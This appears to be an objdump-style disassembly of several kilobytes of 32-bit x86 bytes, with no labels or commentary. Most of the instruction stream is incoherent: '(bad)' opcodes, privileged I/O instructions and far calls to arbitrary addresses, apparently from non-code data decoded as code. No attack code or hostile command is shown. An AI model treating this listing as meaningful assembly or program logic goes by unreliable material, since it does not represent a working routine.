  42530b:	add    BYTE PTR [eax],al
  42530d:	nop
  42530e:	sar    DWORD PTR [edx],0x76
  425311:	xchg   ecx,eax
  425312:	mov    eax,ds:0x812b9d14
  425317:	fwait
  425318:	mov    ebp,DWORD PTR [ebx+0x53afe6fb]
  42531e:	pop    ss
  42531f:	les    ebx,FWORD PTR [edx+0x0]
  425322:	add    BYTE PTR [ebx+0xa3c4],ah
  425328:	inc    esi
  425329:	xchg   esp,eax
  42532a:	mov    bh,0x26
  42532c:	fucomi st,st(6)
  42532e:	lods   al,BYTE PTR gs:[esi]
  425330:	pushf  
  425331:	fwait
  425332:	arpl   WORD PTR [edx+0x1e],ax
  425335:	rol    BYTE PTR [ecx+0x2da57083],cl
  42533b:	jnp    0x425343
  42533d:	adc    esi,edx
  42533f:	pop    edi
  425340:	ins    DWORD PTR es:[edi],dx
  425341:	std    
  425342:	test   al,0x51
  425344:	sub    ah,BYTE PTR [edi]
  425346:	sbb    al,0xfa
  425348:	ja     0x425354
  42534a:	xchg   bh,dh
  42534c:	es das 
  42534e:	fcomp  QWORD PTR [edi-0x72]
  425351:	dec    edi
  425352:	pushw  ss
  425354:	mov    ecx,0xb2a5582c
  425359:	arpl   WORD PTR gs:[edi-0x4a],ax
  42535d:	push   eax
  42535e:	imul   ebx,DWORD PTR ds:0xdd2155a1,0xfffffffb
  425365:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425366:	mov    cl,0xe2
  425368:	aad    0x6a
  42536a:	inc    edi
  42536b:	xor    ch,al
  42536d:	cwde   
  42536e:	lods   al,BYTE PTR ds:[esi]
  42536f:	(bad)  
  425370:	into   
  425371:	inc    edi
  425372:	lods   al,BYTE PTR ds:[esi]
  425373:	stc    
  425374:	sub    DWORD PTR [edx],ebp
  425376:	rol    BYTE PTR [ebp+0x4b140000],0x4
  42537d:	repz add BYTE PTR [eax],al
  425380:	fs mov bh,0x47
  425383:	sbb    al,0xab
  425385:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  425387:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425388:	push   ebp
  425389:	fidiv  DWORD PTR [edx+0x40]
  42538c:	sbb    al,0x0
  42538e:	add    BYTE PTR [esp+edx*4-0x374ab8d1],bh
  425395:	mov    es,WORD PTR [eax]
  425397:	add    BYTE PTR [ebx],bl
  425399:	xor    esp,DWORD PTR [eax+edx*8+0x4eba0ee3]
  4253a0:	mov    WORD PTR [ebp+0x0],?
  4253a3:	add    BYTE PTR [ecx-0x10],cl
  4253a6:	clc    
  4253a7:	xchg   edi,eax
  4253a8:	dec    ebx
  4253a9:	jp     0x4253b5
  4253ab:	jnp    0x425348
  4253ad:	jge    0x425400
  4253af:	pusha  
  4253b0:	fst    DWORD PTR [esi+0x48]
  4253b3:	dec    eax
  4253b4:	add    BYTE PTR [eax],al
  4253b6:	jno    0x4253e4
  4253b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4253b9:	mov    ah,0x15
  4253bb:	aaa    
  4253bc:	pop    ecx
  4253bd:	xchg   ebp,eax
  4253be:	pop    ebp
  4253bf:	pop    ds
  4253c0:	rcl    esi,0x8d
  4253c3:	sub    ebp,DWORD PTR ds:0xe90dafd9
  4253c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4253ca:	sbb    DWORD PTR [ebp+0x9a880a],eax
  4253d0:	add    ch,dl
  4253d2:	sub    bh,dh
  4253d4:	pushf  
  4253d5:	push   ds
  4253d6:	outs   dx,DWORD PTR ds:[esi]
  4253d7:	pushf  
  4253d8:	adc    al,0x25
  4253da:	stos   DWORD PTR es:[edi],eax
  4253db:	jb     0x425444
  4253dd:	call   0x3def:0xff339f9c
  4253e4:	(bad)  
  4253e5:	jne    0x425382
  4253e7:	mov    ah,0xf9
  4253e9:	jb     0x4253ad
  4253eb:	and    DWORD PTR [edi+0x22d34b75],ebx
  4253f1:	popa   
  4253f2:	adc    ebp,eax
  4253f4:	fistp  DWORD PTR [eax]
  4253f6:	jns    0x42545d
  4253f8:	sbb    BYTE PTR ds:[edx+0x79d1525f],0x5a
  425400:	push   edx
  425401:	ror    eax,0x68
  425404:	add    BYTE PTR [eax],al
  425406:	push   ebp
  425407:	xlat   BYTE PTR ds:[ebx]
  425408:	mov    dl,0x6d
  42540a:	scas   al,BYTE PTR es:[edi]
  42540b:	(bad)  
  42540c:	or     DWORD PTR [ecx],edi
  42540e:	sub    DWORD PTR [eax],edi
  425410:	ss into 
  425412:	std    
  425413:	bound  ebx,QWORD PTR [esi+0x5a]
  425416:	dec    edi
  425417:	fmul   st(6),st
  425419:	cli    
  42541a:	and    esi,DWORD PTR ds:0x7f1116d4
  425420:	pop    edx
  425421:	(bad)  
  425422:	push   edi
  425423:	ret    0xf1f5
  425426:	mov    al,0x63
  425428:	mov    al,0x78
  42542a:	ins    BYTE PTR es:[edi],dx
  42542b:	mov    ebx,0xa66e1832
  425430:	inc    esi
  425431:	jecxz  0x4254a9
  425433:	(bad)  
  425437:	add    dh,al
  425439:	or     DWORD PTR [edx],edi
  42543b:	call   0xc200:0x59c83f
  425442:	loop   0x425496
  425444:	push   ebx
  425445:	sbb    ebp,DWORD PTR [edi+0x67dfdcf1]
  42544b:	add    ebp,esp
  42544d:	ins    DWORD PTR es:[edi],dx
  42544e:	xchg   esp,eax
  42544f:	adc    BYTE PTR [ecx+0x254dd015],bl
  425455:	sbb    dh,BYTE PTR [eax]
  425457:	sbb    dh,dh
  425459:	data16 add ch,BYTE PTR [edx]
  42545c:	adc    DWORD PTR [ebx+esi*4+0x14],0x47
  425461:	mov    edx,0xcf06d23d
  425466:	mov    bl,0x7
  425468:	cdq    
  425469:	xchg   esp,eax
  42546a:	int    0x6a
  42546c:	(bad)  
  42546d:	cmp    eax,0x170869
  425472:	add    BYTE PTR [ebp+0x52],bl
  425475:	cdq    
  425476:	jle    0x42546c
  425478:	cwde   
  425479:	dec    eax
  42547a:	push   ss
  42547b:	add    BYTE PTR [eax],al
  42547d:	mov    ah,dh
  42547f:	add    BYTE PTR [eax],al
  425481:	jns    0x42543c
  425483:	mov    ds:0x8d7e9aa0,eax
  425488:	rol    DWORD PTR [edx+ebx*4],1
  42548b:	add    BYTE PTR [eax],al
  42548d:	cs sbb eax,0x53974efd
  425493:	pop    edx
  425494:	push   ss
  425495:	leave  
  425496:	and    BYTE PTR [eax],ah
  425498:	sbb    DWORD PTR [edx+edx*4-0x51],esi
  42549c:	mov    al,0x82
  42549e:	ror    bh,cl
  4254a0:	call   0x84aa:0x96aae633
  4254a7:	or     al,BYTE PTR [eax]
  4254a9:	add    BYTE PTR [ecx+0x6c],bl
  4254ac:	sti    
  4254ad:	cmp    BYTE PTR [eax+0x15556796],dl
  4254b3:	es inc eax
  4254b5:	ret    
  4254b6:	add    BYTE PTR [eax],al
  4254b8:	jmp    0x127dc979
  4254bd:	add    cl,bl
  4254bf:	add    BYTE PTR [eax],al
  4254c1:	dec    edi
  4254c2:	mov    ah,BYTE PTR [eax]
  4254c4:	jbe    0x42544f
  4254c6:	call   0xbd6f:0x14e8749a
  4254cd:	test   DWORD PTR [ebx],0x771198f
  4254d3:	adc    edx,esp
  4254d5:	push   ecx
  4254d6:	cld    
  4254d7:	push   edx
  4254d8:	adc    eax,DWORD PTR [ebp-0x6383905b]
  4254de:	or     DWORD PTR [eax-0x28ffff9e],0x53
  4254e5:	mov    DWORD PTR [ecx-0x6a],eax
  4254e8:	retf   
  4254e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4254ea:	(bad)
  4254ed:	sbb    edi,DWORD PTR [edx-0x1c]
  4254f0:	inc    ebp
  4254f1:	xor    ch,BYTE PTR [esi+0x789fe9ec]
  4254f7:	icebp  
  4254f8:	pop    esp
  4254f9:	fisub  DWORD PTR ss:[ebp+0x4c3a9339]
  425500:	mov    ebp,0x90d70000
  425505:	call   0xc04f8a68
  42550a:	outs   dx,DWORD PTR ds:[esi]
  42550b:	add    BYTE PTR [eax],al
  42550d:	or     DWORD PTR [ecx+0x30],ebp
  425510:	xchg   ecx,eax
  425511:	sub    eax,DWORD PTR [ecx]
  425513:	mov    eax,0xe65a2ee4
  425518:	mov    ebp,DWORD PTR [edi]
  42551a:	je     0x4254e6
  42551c:	inc    ebp
  42551d:	and    dl,BYTE PTR [ebp-0x6e]
  425520:	fisubr WORD PTR [esi+0x21]
  425523:	jae    0x425513
  425525:	outs   dx,DWORD PTR ds:[esi]
  425526:	aas    
  425527:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425528:	push   edi
  425529:	fild   DWORD PTR [edi]
  42552b:	add    ebx,ebp
  42552d:	push   edi
  42552e:	sub    ah,BYTE PTR [edi+0x44f8f2ee]
  425534:	aad    0x0
  425536:	add    BYTE PTR [esi+0x457970b2],al
  42553c:	loope  0x4254cf
  42553e:	jae    0x4254c5
  425540:	lods   eax,DWORD PTR ds:[esi]
  425541:	retf   0xf7e8
  425544:	fcomp  QWORD PTR [eax-0x2c]
  425547:	out    dx,eax
  425548:	mov    bl,BYTE PTR [ebp+0x37]
  42554b:	and    BYTE PTR [edi],bh
  42554d:	and    BYTE PTR [ebx+0x31],ch
  425550:	and    bl,bh
  425552:	jo     0x42550f
  425554:	fnstsw WORD PTR [ebx-0x10]
  425557:	xchg   edx,eax
  425558:	fld    QWORD PTR [ecx+0x34]
  42555b:	xchg   esi,eax
  42555c:	xchg   esi,eax
  42555d:	xor    BYTE PTR [ebp-0x63],bh
  425560:	sar    DWORD PTR [edx],0x2a
  425563:	cmp    bl,bh
  425565:	push   eax
  425566:	mov    al,bl
  425568:	ins    BYTE PTR es:[edi],dx
  425569:	pop    esi
  42556a:	add    eax,0xadd6641e
  42556f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425570:	rol    BYTE PTR [ecx-0xa],cl
  425573:	inc    esp
  425574:	fwait
  425575:	add    BYTE PTR [eax],al
  425577:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425578:	icebp  
  425579:	int3   
  42557a:	sub    BYTE PTR [eax],al
  42557c:	add    al,cl
  42557e:	mov    eax,0x253d0000
  425583:	jae    0x42552d
  425585:	jbe    0x4255b3
  425587:	std    
  425588:	cwde   
  425589:	ret    0xf8e6
  42558c:	and    BYTE PTR [ecx-0x22598358],bl
  425592:	or     eax,0xc78e2810
  425597:	or     bl,BYTE PTR ds:0x327b529e
  42559d:	and    eax,0x4584e2
  4255a2:	add    BYTE PTR [ecx-0x368c7618],al
  4255a8:	stos   DWORD PTR es:[edi],eax
  4255a9:	ret    
  4255aa:	or     eax,0xe7ef1ea7
  4255af:	fsubr  QWORD PTR [ecx]
  4255b1:	add    al,0xab
  4255b3:	add    BYTE PTR [eax],al
  4255b5:	mov    dh,BYTE PTR [ecx]
  4255b7:	cli    
  4255b8:	push   cs
  4255b9:	aam    0x57
  4255bb:	div    DWORD PTR ds:0x7e831be3
  4255c1:	jp     0x4255bd
  4255c3:	pop    esi
  4255c4:	fidivr DWORD PTR [ebx-0x77]
  4255c7:	je     0x4255a5
  4255c9:	jns    0x425573
  4255cb:	sub    BYTE PTR [ebp-0xc],dh
  4255ce:	jle    0x4255be
  4255d0:	inc    edx
  4255d1:	push   eax
  4255d2:	inc    esp
  4255d3:	sldt   WORD PTR [eax]
  4255d6:	and    bh,0x0
  4255d9:	add    dh,bh
  4255db:	inc    esi
  4255dc:	mov    ds:0x1cf7e7f1,eax
  4255e1:	fbstp  TBYTE PTR [ebx+0x5d9e13d0]
  4255e7:	aas    
  4255e8:	mov    bl,0xf8
  4255ea:	ins    BYTE PTR es:[edi],dx
  4255eb:	jecxz  0x4255ef
  4255ed:	icebp  
  4255ee:	jb     0x425663
  4255f0:	and    DWORD PTR ds:[edx],ebx
  4255f3:	jmp    0x4255db
  4255f5:	push   edi
  4255f6:	nop
  4255f7:	and    eax,0x9d978a60
  4255fc:	push   ss
  4255fd:	inc    eax
  4255fe:	js     0x425600
  425600:	add    ch,dl
  425602:	sti    
  425603:	loopne 0x4255a9
  425605:	sbb    BYTE PTR [edx],dl
  425607:	into   
  425608:	imul   DWORD PTR [ecx+0x7f]
  42560b:	push   cs
  42560c:	enter  0xa1,0x0
  425610:	cwde   
  425611:	mov    edx,0x5984ea62
  425616:	add    BYTE PTR [eax],al
  425618:	and    eax,0x14e2db49
  42561d:	out    dx,eax
  42561e:	scas   al,BYTE PTR es:[edi]
  42561f:	cdq    
  425620:	push   esi
  425621:	ds ret 
  425623:	imul   ebx,DWORD PTR [edi+0x4f],0xffffffeb
  425627:	cmp    bh,BYTE PTR [ecx+ebx*4+0x64]
  42562b:	cwde   
  42562c:	xchg   edx,eax
  42562d:	test   eax,eax
  42562f:	cmp    eax,0xb52f0000
  425634:	cmp    BYTE PTR [eax+0x1d],dh
  425637:	sahf   
  425638:	repnz fistp QWORD PTR [ecx-0x336300a9]
  42563f:	test   al,0x0
  425641:	add    BYTE PTR [eax-0x5d],al
  425644:	add    BYTE PTR [eax],al
  425646:	les    esi,FWORD PTR [ebx-0x36d90000]
  42564c:	out    0x97,eax
  42564e:	popa   
  42564f:	xor    dh,BYTE PTR [edx+0x23]
  425652:	push   esp
  425653:	test   ebp,edi
  425655:	data16 xor cl,BYTE PTR [esi-0x6f]
  425659:	xor    ebx,DWORD PTR [edx]
  42565b:	jle    0xb65cfc62
  425661:	xor    eax,0x69c327aa
  425666:	and    ecx,DWORD PTR [ebp-0x70]
  425669:	iret   
  42566a:	pop    ecx
  42566b:	sub    ebp,DWORD PTR [ebp-0x75]
  42566e:	xlat   BYTE PTR ds:[ebx]
  42566f:	sar    DWORD PTR ds:0xa3c1c6a9,0x96
  425676:	pop    ebx
  425677:	cmp    BYTE PTR [edi+0x0],0x0
  42567b:	test   eax,0xede859e9
  425680:	ins    BYTE PTR es:[edi],dx
  425681:	les    esi,FWORD PTR [edi]
  425683:	add    BYTE PTR [eax],al
  425685:	mov    ebp,0xfe9dd014
  42568a:	jbe    0x425700
  42568c:	test   DWORD PTR [ebp-0x6e9f5418],ecx
  425692:	add    esi,DWORD PTR [ecx-0x3c]
  425695:	xchg   edi,eax
  425696:	add    BYTE PTR [eax],al
  425698:	retf   
  425699:	outs   dx,BYTE PTR ds:[esi]
  42569a:	loope  0x425694
  42569c:	inc    esp
  42569d:	add    BYTE PTR gs:[eax],al
  4256a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4256a1:	outs   dx,DWORD PTR ds:[esi]
  4256a2:	jl     0x4256f8
  4256a4:	popf   
  4256a5:	out    0x1e,eax
  4256a7:	push   es
  4256a8:	shr    esp,1
  4256aa:	inc    eax
  4256ab:	mov    edi,0x1a130000
  4256b0:	cmp    BYTE PTR [ebx-0x79afc060],bh
  4256b6:	pop    edx
  4256b7:	jmp    0xd712f396
  4256bc:	lds    eax,FWORD PTR [esi+ebp*1+0x0]
  4256c0:	add    BYTE PTR [ecx],dh
  4256c2:	jge    0x425707
  4256c4:	ds cmp eax,0x9f1260e
  4256ca:	dec    ebx
  4256cb:	mov    ebp,0xb4b78226
  4256d0:	shl    DWORD PTR [ebx-0x4f],0x69
  4256d4:	pop    eax
  4256d5:	gs mov al,0xda
  4256d8:	pop    ecx
  4256d9:	aad    0x19
  4256db:	in     eax,0x17
  4256dd:	xchg   edx,eax
  4256de:	pop    eax
  4256df:	rcl    BYTE PTR [eax],0x0
  4256e2:	add    cl,al
  4256e4:	xchg   ebp,eax
  4256e5:	fisub  WORD PTR [ecx+0x47396a07]
  4256eb:	stos   BYTE PTR es:[edi],al
  4256ec:	adc    ebx,DWORD PTR [ecx-0x1b7ccf10]
  4256f2:	sub    ecx,ecx
  4256f4:	push   esp
  4256f5:	add    DWORD PTR [eax],esi
  4256f7:	jo     0x4256ae
  4256f9:	test   eax,0x22e2db3d
  4256fe:	jmp    0xcf9055b6
  425703:	loope  0x4256e5
  425705:	(bad)  
  425706:	mov    ebp,DWORD PTR [ebx]
  425708:	arpl   WORD PTR [edx-0x52ad2ce9],dx
  42570e:	push   ss
  42570f:	jns    0x4256d8
  425711:	loopne 0x4256d8
  425713:	push   edx
  425714:	xor    BYTE PTR [ebx+0x0],0x0
  425718:	aaa    
  425719:	jae    0x4256ba
  42571b:	mov    ch,0xd6
  42571d:	mov    edx,0x201b7ceb
  425722:	and    BYTE PTR [edi+0x2c],al
  425725:	sub    BYTE PTR [eax+eax*1+0x0],0xaf
  42572a:	push   DWORD PTR [esi+0x6eca57b7]
  425730:	xor    edx,DWORD PTR [edi]
  425732:	call   0xc1cc68b4
  425737:	or     edi,ebp
  425739:	retf   
  42573a:	xchg   edx,eax
  42573b:	xchg   edx,eax
  42573c:	pop    esp
  42573d:	retf   0xa9ff
  425740:	dec    ebp
  425741:	mov    al,ds:0xf28c
  425746:	fisubr DWORD PTR [ebx+0x71]
  425749:	mov    cl,BYTE PTR [ebp+0x59]
  42574c:	cmp    DWORD PTR [eax+esi*8-0x64b0235d],0xffffffea
  425754:	js     0x425786
  425756:	out    0x54,eax
  425758:	cmp    BYTE PTR [edi+0x5f],bh
  42575b:	mov    BYTE PTR [edx+0x0],bh
  42575e:	add    BYTE PTR [edx],ch
  425760:	out    dx,al
  425761:	loopne 0x425765
  425763:	mov    ?,WORD PTR [eax+0x57]
  425766:	mov    al,ds:0x961a9ffd
  42576b:	shl    DWORD PTR [eax+ecx*2],cl
  42576e:	test   DWORD PTR [eax],0x49c3f000
  425774:	inc    ebx
  425775:	adc    al,0xbf
  425777:	imul   esi,DWORD PTR [ebp+0x7dc67019],0xd6d8d274
  425781:	cld    
  425782:	es int 0xe6
  425785:	stos   BYTE PTR es:[edi],al
  425786:	popf   
  425787:	sbb    esp,DWORD PTR [eax]
  425789:	fdiv   QWORD PTR [eax-0x2d]
  42578c:	jno    0x4257c5
  42578e:	ret    
  42578f:	jo     0x425792
  425791:	mov    ds:0x2c1e6e58,eax
  425796:	jb     0x4257d5
  425798:	pop    esp
  425799:	or     eax,DWORD PTR [ebx]
  42579b:	icebp  
  42579c:	push   eax
  42579d:	daa    
  42579e:	mov    DWORD PTR [eax-0x7b],ebp
  4257a1:	add    ebx,DWORD PTR [edx]
  4257a3:	inc    edx
  4257a4:	mov    ah,0xd2
  4257a6:	call   0x24757cbc
  4257ab:	(bad)  
  4257ac:	lea    esi,[eax+ebx*4]
  4257af:	lock xchg edx,eax
  4257b2:	jnp    0x425741
  4257b4:	imul   edi,DWORD PTR [esi-0x52],0x131fa629
  4257bb:	arpl   WORD PTR [ecx+0x73],si
  4257be:	or     eax,0xa92d8b72
  4257c3:	adc    DWORD PTR [ebx+0x6d],esi
  4257c6:	fiadd  WORD PTR [edx+0x17]
  4257c9:	retf   
  4257ca:	test   BYTE PTR [eax+eax*1+0x22560e00],bl
  4257d1:	ror    DWORD PTR [ebx+0x50],cl
  4257d4:	fs pop ds
  4257d6:	imul   ebx,DWORD PTR [ecx],0x47c068
  4257dc:	add    BYTE PTR [ebp-0x7dce92d],al
  4257e2:	iret   
  4257e3:	stos   DWORD PTR es:[edi],eax
  4257e4:	pop    es
  4257e5:	outs   dx,DWORD PTR ds:[esi]
  4257e6:	pop    edx
  4257e7:	sbb    ch,dh
  4257e9:	sbb    eax,0x2071bf69
  4257ee:	aad    0x21
  4257f0:	(bad)  
  4257f1:	out    0x57,al
  4257f3:	mov    ecx,0xf0e4740a
  4257f8:	sub    ch,dh
  4257fa:	gs xchg ebx,eax
  4257fc:	dec    esi
  4257fd:	pop    esi
  4257fe:	cmp    ch,BYTE PTR [bp+di-0x11]
  425802:	(bad)  
  425803:	ins    BYTE PTR es:[edi],dx
  425804:	pop    eax
  425805:	sbb    eax,0x9d8f8e2c
  42580a:	xchg   edi,eax
  42580b:	enter  0x89,0x0
  42580f:	xor    bh,dh
  425811:	mov    edi,0xe1e99adf
  425816:	fsubr  DWORD PTR [eax+edx*1]
  425819:	inc    ebx
  42581a:	(bad)  
  42581b:	(bad)  
  42581c:	sbb    al,0x54
  42581e:	(bad)  
  42581f:	cs popf 
  425821:	sub    al,0x2f
  425823:	mov    al,0xa6
  425825:	jb     0x425884
  425827:	push   esp
  425828:	sbb    BYTE PTR [ecx-0x17],al
  42582b:	mov    dl,0x7d
  42582d:	jo     0x4257c0
  42582f:	aas    
  425830:	push   ecx
  425831:	aaa    
  425832:	or     al,ch
  425834:	add    ah,BYTE PTR [esi-0x745e6c7]
  42583a:	or     edi,esi
  42583c:	inc    ebx
  42583d:	sti    
  42583e:	inc    esp
  42583f:	mov    esi,0x5c5b0000
  425844:	rcr    BYTE PTR [eax+0x3c7c0000],0xcf
  42584b:	ret    
  42584c:	jecxz  0x4258c7
  42584e:	loop   0x425887
  425850:	and    BYTE PTR [eax-0x75b75ee1],bl
  425856:	add    BYTE PTR [eax],al
  425858:	dec    ebx
  425859:	pop    esi
  42585a:	dec    edx
  42585b:	jge    0x425839
  42585d:	fnstcw WORD PTR [edi+ebp*1]
  425860:	add    DWORD PTR [edx-0x70e0f070],ebp
  425866:	jns    0x4258b1
  425868:	std    
  425869:	pushf  
  42586a:	ins    DWORD PTR es:[edi],dx
  42586b:	ret    
  42586c:	jmp    0x4258ca
  42586e:	loop   0x425853
  425870:	pop    es
  425871:	mov    bl,0x16
  425873:	and    BYTE PTR [esi],dl
  425875:	inc    esp
  425876:	fiadd  WORD PTR [eax]
  425878:	add    BYTE PTR [eax+0x7f1d3a1c],dh
  42587e:	int3   
  42587f:	and    BYTE PTR [eax],al
  425881:	add    ch,cl
  425883:	sub    DWORD PTR [esi-0x85d49d6],edi
  425889:	jne    0x4258d5
  42588b:	mov    BYTE PTR [eax+0x78070000],ch
  425891:	inc    ebx
  425892:	mov    ebp,0x10ed6977
  425897:	aaa    
  425898:	xchg   edi,eax
  425899:	push   ds
  42589a:	jnp    0x3cd1de13
  4258a0:	xor    eax,0x4ebbd5df
  4258a5:	rcl    BYTE PTR [ebx-0x1a],cl
  4258a8:	mov    al,ds:0x2a4a090d
  4258ad:	inc    esp
  4258ae:	sub    al,BYTE PTR [eax]
  4258b0:	add    BYTE PTR [edx+0xfb4ce3],ch
  4258b6:	add    BYTE PTR [eax+eax*4],dh
  4258b9:	and    al,0x0
  4258bb:	add    BYTE PTR [edi],ch
  4258bd:	mov    ah,0x55
  4258bf:	jmp    0x62a531
  4258c4:	add    BYTE PTR [edi+0x2b],dl
  4258c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4258c8:	xlat   BYTE PTR ds:[ebx]
  4258c9:	in     al,0xea
  4258cb:	inc    ebx
  4258cc:	lea    ecx,ds:0xd4b10682
  4258d2:	push   esp
  4258d3:	fisttp DWORD PTR [ebp+0x7c]
  4258d6:	jo     0x4258e8
  4258d8:	std    
  4258d9:	add    dl,BYTE PTR [ebx+0x8a3ef03]
  4258df:	push   0xdcdd0000
  4258e4:	imul   ebp,ecx,0x4403cf6c
  4258ea:	push   0xbf0f0000
  4258ef:	pop    edx
  4258f0:	addr16 ret 
  4258f2:	stos   DWORD PTR es:[edi],eax
  4258f3:	xor    esi,DWORD PTR [ecx-0x57]
  4258f6:	jno    0x4258d0
  4258f8:	mov    edi,0x6f5d4a7
  4258fd:	retf   0x7aa3
  425900:	mov    al,0x56
  425902:	cmovle esi,ebp
  425905:	add    bl,dl
  425907:	add    BYTE PTR [eax],al
  425909:	inc    edi
  42590a:	ja     0x4258a3
  42590c:	div    BYTE PTR [ebx+0x7b]
  42590f:	test   BYTE PTR [edx+0x63d90000],ch
  425915:	and    al,cl
  425917:	dec    edi
  425918:	add    BYTE PTR [eax],al
  42591a:	je     0x425997
  42591c:	sbb    al,0xc7
  42591e:	fsubr  QWORD PTR [eax-0x76795fb3]
  425924:	out    dx,eax
  425925:	shl    BYTE PTR gs:[esi],0x0
  425929:	add    BYTE PTR [edx],al
  42592b:	sar    BYTE PTR [edx+0x33bda299],cl
  425931:	mov    ds:0xdc44,al
  425936:	stc    
  425937:	inc    ebx
  425938:	adc    eax,esp
  42593a:	add    al,0xd5
  42593c:	add    BYTE PTR [eax],al
  42593e:	pop    edx
  42593f:	mov    ds:0x7415680e,al
  425944:	pushfw 
  425946:	stc    
  425947:	push   ds
  425948:	(bad)  
  425949:	sub    al,cl
  42594b:	cmc    
  42594c:	add    BYTE PTR [eax],al
  42594e:	add    al,0x53
  425950:	add    BYTE PTR [eax],al
  425952:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425953:	sbb    DWORD PTR [ebp-0x1c],ecx
  425956:	retf   0x7119
  425959:	mov    bl,0x6b
  42595b:	daa    
  42595c:	adc    DWORD PTR [esi+0x688c43d2],ebx
  425962:	add    BYTE PTR [eax],al
  425964:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425965:	rcl    BYTE PTR [ecx],1
  425967:	cs mov dh,bl
  42596a:	add    BYTE PTR [eax],al
  42596c:	popf   
  42596d:	pop    ebp
  42596e:	call   0x1d1cd9
  425973:	in     al,dx
  425974:	and    cl,BYTE PTR [ebx-0xc7fe9fd]
  42597a:	add    BYTE PTR [eax],al
  42597c:	ss clc 
  42597e:	pop    esi
  42597f:	jmp    0x4259a1
  425981:	loop   0x425972
  425983:	mov    esp,0x1f4cfb
  425988:	add    BYTE PTR [edi],bl
  42598a:	rol    DWORD PTR [esi-0x70],cl
  42598d:	lea    ecx,[ecx+0x3f036ff]
  425993:	xor    DWORD PTR [edx+ecx*4],esp
  425996:	dec    edi
  425997:	int3   
  425998:	aas    
  425999:	add    BYTE PTR [eax],al
  42599b:	cmp    DWORD PTR [ebx*4-0x1e036eed],0xfffffff6
  4259a3:	mov    ds:0x4b4ea69e,al
  4259a8:	xor    BYTE PTR [ecx-0x5b20e1d3],ch
  4259ae:	add    al,0xbd
  4259b0:	add    BYTE PTR [eax],al
  4259b2:	(bad)  
  4259b3:	jmp    0x214ac39a
  4259b8:	add    BYTE PTR [eax],al
  4259ba:	inc    esi
  4259bb:	sbb    DWORD PTR [ebx+0x2a],ecx
  4259be:	in     al,0x40
  4259c0:	out    dx,al
  4259c1:	add    BYTE PTR [eax],al
  4259c3:	inc    ebp
  4259c4:	in     eax,0x7b
  4259c6:	(bad)  
  4259c7:	loop   0x425977
  4259c9:	gs je  0x42598d
  4259cc:	shl    BYTE PTR [eax+0xd72a0f9],1
  4259d2:	ror    DWORD PTR [ecx-0x45],1
  4259d5:	sbb    eax,0xa2be0f31
  4259da:	add    eax,0x4dcd457c
  4259df:	pop    es
  4259e0:	lods   al,BYTE PTR ds:[esi]
  4259e1:	fmul   DWORD PTR [edx-0x55]
  4259e4:	out    0xae,eax
  4259e6:	cmp    al,0x38
  4259e8:	adc    eax,0xa7bc471f
  4259ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4259ee:	pop    esp
  4259ef:	mov    al,0xb8
  4259f1:	lods   al,BYTE PTR ds:[esi]
  4259f2:	imul   ecx,ebp,0xc3816950
  4259f8:	inc    ebp
  4259f9:	and    DWORD PTR [ecx-0x7cb00d70],esp
  4259ff:	out    dx,eax
  425a00:	jle    0x425a21
  425a02:	xor    esp,DWORD PTR [ebx+0x49]
  425a05:	jecxz  0x425a05
  425a07:	ret    0x6311
  425a0a:	dec    edx
  425a0b:	sub    eax,0xb627beaa
  425a10:	sub    ebp,DWORD PTR [ebx+0x6264f942]
  425a16:	mov    DWORD PTR [ebp-0x35c467bf],esi
  425a1c:	mov    ds:0xe3463,eax
  425a21:	sbb    al,0x0
  425a23:	add    BYTE PTR [edx-0x13],cl
  425a26:	pop    ebp
  425a27:	js     0x425a71
  425a29:	jae    0x425a2b
  425a2b:	add    BYTE PTR [ebp+0x13f0d715],dl
  425a31:	imul   BYTE PTR [ecx-0x6026e417]
  425a37:	xor    dh,BYTE PTR [ebx+0x79]
  425a3a:	pop    esp
  425a3b:	push   cs
  425a3c:	adc    al,0x93
  425a3e:	das    
  425a3f:	lds    ebp,FWORD PTR [edi+0x4a5cc6bc]
  425a45:	push   ecx
  425a46:	dec    eax
  425a47:	xchg   esi,eax
  425a48:	add    BYTE PTR [eax],al
  425a4a:	add    eax,0x992ea2f5
  425a4f:	pop    esp
  425a50:	aas    
  425a51:	sub    al,0x6f
  425a53:	repz jno 0x425a5f
  425a56:	rol    DWORD PTR [edi+0x12b63db2],1
  425a5c:	push   ds
  425a5d:	in     al,dx
  425a5e:	out    dx,eax
  425a5f:	js     0x425a1f
  425a61:	outs   dx,DWORD PTR ds:[esi]
  425a62:	mov    bh,0x33
  425a64:	push   ebp
  425a65:	loopne 0x425a2e
  425a67:	mov    cl,0xad
  425a69:	js     0x425ae5
  425a6b:	mov    al,ds:0xd436d694
  425a70:	jno    0x425ab8
  425a72:	mov    dh,0xda
  425a74:	aaa    
  425a75:	pop    esp
  425a76:	data16 cmp al,dl
  425a79:	aam    0x5
  425a7b:	sti    
  425a7c:	into   
  425a7d:	mov    edi,0x84de3629
  425a82:	into   
  425a83:	add    BYTE PTR [eax],al
  425a85:	rcl    DWORD PTR [edi-0x78],cl
  425a88:	dec    esp
  425a89:	add    BYTE PTR [eax],al
  425a8b:	xchg   BYTE PTR [ecx],bl
  425a8d:	iret   
  425a8e:	retf   
  425a8f:	inc    eax
  425a90:	xchg   edx,eax
  425a91:	add    BYTE PTR [eax],al
  425a93:	sub    cl,bl
  425a95:	mov    ecx,0xe805894a
  425a9a:	dec    edi
  425a9b:	mov    DWORD PTR [ebp+0xe],esp
  425a9e:	stos   BYTE PTR es:[edi],al
  425a9f:	pop    es
  425aa0:	xchg   esi,eax
  425aa1:	retf   0x9e41
  425aa4:	add    DWORD PTR [edi],edx
  425aa6:	xor    dl,ch
  425aa8:	aam    0x47
  425aaa:	push   esp
